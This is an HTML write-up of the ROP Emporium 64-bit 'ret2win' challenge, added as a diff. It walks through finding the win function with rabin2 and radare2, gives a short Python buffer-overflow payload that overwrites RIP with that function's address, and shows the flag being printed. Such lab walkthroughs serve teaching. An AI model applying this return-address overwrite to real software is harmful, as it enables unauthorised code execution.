@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#ROP Emporium - 64bit - ret2win</strong></h1>
+        <a href="https://ropemporium.com/challenge/ret2win.html">https://ropemporium.com/challenge/ret2win.html</a><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>Challenge Description</strong></h2><br>
+        Description for <code>ret2win</code> on ropemporium:<br>
+            <div class="codebox">
+                Locate&nbsp;a&nbsp;method&nbsp;within&nbsp;the&nbsp;binary&nbsp;that&nbsp;you&nbsp;want&nbsp;to&nbsp;call&nbsp;and&nbsp;do&nbsp;so&nbsp;by&nbsp;overwriting&nbsp;a&nbsp;saved&nbsp;return&nbsp;address&nbsp;on&nbsp;the&nbsp;stack.
+            </div>
+        </div><br>
+        <br>
+        Our goal is to find a function to return that lets us win/read the flag.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>1) Browse ret2win's functions</strong></h2><br>
+        Read the user defined functions in the <code>ret2win</code> binary using rabin2.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/1-ret2win#&nbsp;rabin2&nbsp;-qs&nbsp;ret2win&nbsp;|&nbsp;grep&nbsp;-ve&nbsp;imp&nbsp;-e&nbsp;'&nbsp;0&nbsp;'<br>
+                0x00601088&nbsp;1&nbsp;completed.7585<br>
+                0x004007b5&nbsp;92&nbsp;pwnme<br>
+                0x00400811&nbsp;32&nbsp;ret2win<br>
+                0x004008b0&nbsp;2&nbsp;__libc_csu_fini<br>
+                0x00601060&nbsp;8&nbsp;stdout@@GLIBC_2.2.5<br>
+                0x00601070&nbsp;8&nbsp;stdin@@GLIBC_2.2.5<br>
+                0x004008c0&nbsp;4&nbsp;_IO_stdin_used<br>
+                0x00400840&nbsp;101&nbsp;__libc_csu_init<br>
+                0x00400650&nbsp;42&nbsp;_start<br>
+                0x00400746&nbsp;111&nbsp;main<br>
+                0x00601080&nbsp;8&nbsp;stderr@@GLIBC_2.2.5
+            </div>
+        </div><br>
+        <br>
+        The <code>ret2win</code> function looks interesting.<br>
+        Disassemble the function into assembly and have read of it using <code>radare2</code>.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/1-ret2win#&nbsp;r2&nbsp;ret2win<br>
+                [0x00400650]&gt;&nbsp;aa<br>
+                [x]&nbsp;Analyze&nbsp;all&nbsp;flags&nbsp;starting&nbsp;with&nbsp;sym.&nbsp;and&nbsp;entry0&nbsp;(aa)<br>
+                [0x00400650]&gt;&nbsp;pdf@sym.ret2win<br>
+                /&nbsp;(fcn)&nbsp;sym.ret2win&nbsp;32<br>
+                |&nbsp;&nbsp;&nbsp;sym.ret2win&nbsp;();<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400811&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rbp<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400812&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4889e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rbp,&nbsp;rsp<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400815&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bfe0094000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edi,&nbsp;str.Thank_you__Here_s_your_flag:&nbsp;;&nbsp;0x4009e0&nbsp;;&nbsp;"Thank&nbsp;you!&nbsp;Here's&nbsp;your&nbsp;flag:"<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0040081a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b800000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;0<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0040081f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e8ccfdffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;sym.imp.printf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;int&nbsp;printf(const&nbsp;char&nbsp;*format)<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400824&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bffd094000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edi,&nbsp;str.bin_cat_flag.txt&nbsp;;&nbsp;0x4009fd&nbsp;;&nbsp;"/bin/cat&nbsp;flag.txt"<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400829&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e8b2fdffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;sym.imp.system&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;int&nbsp;system(const&nbsp;char&nbsp;*string)<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0040082e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0040082f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;rbp<br>
+                \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00400830&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
+            </div>
+        </div><br>
+        <br>
+        As you can tell from the strings, <code>ret2win</code> says “Thank you!� and runs <code>system("/bin/cat flag.txt")</code>, which prints the flag for us.<br>
+        <br>
+        In order to win, we should return to this ret2win function.<br>
+        We overflow the buffer and overwrite RIP with the address of the ret2win function - <code>0x00400811</code>.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>2) Write exploit script</strong></h2><br>
+        Here is my python script to generate the payload.<br>
+        The offset to RIP is 40 bytes (this is given in the challenge description under ‘Double Check’), and following that we write the address of our ret2win function.<br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
+                <br>
+                ret2win_func&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400811</span>)<br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span><br>
+                payload&nbsp;+=&nbsp;ret2win_func<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>3) Win</strong></h2><br>
+        Run your exploit script and pipe your payload to the binary.<br>
+        <code>system("/bin/cat flag.txt")</code> will run and the flag will be printed out.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/1-ret2win#&nbsp;python&nbsp;ret2winpwn.py&nbsp;|&nbsp;./ret2win<br>
+                ret2win&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                For&nbsp;my&nbsp;first&nbsp;trick,&nbsp;I&nbsp;will&nbsp;attempt&nbsp;to&nbsp;fit&nbsp;50&nbsp;bytes&nbsp;of&nbsp;user&nbsp;input&nbsp;into&nbsp;32&nbsp;bytes&nbsp;of&nbsp;stack&nbsp;buffer;<br>
+                What&nbsp;could&nbsp;possibly&nbsp;go&nbsp;wrong?<br>
+                You&nbsp;there&nbsp;madam,&nbsp;may&nbsp;I&nbsp;have&nbsp;your&nbsp;input&nbsp;please?&nbsp;And&nbsp;don't&nbsp;worry&nbsp;about&nbsp;null&nbsp;bytes,&nbsp;we're&nbsp;using&nbsp;fgets!<br>
+                <br>
+                &gt;&nbsp;Thank&nbsp;you!&nbsp;Here's&nbsp;your&nbsp;flag:ROPE{a_placeholder_32byte_flag!}<br>
+                Segmentation&nbsp;fault
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
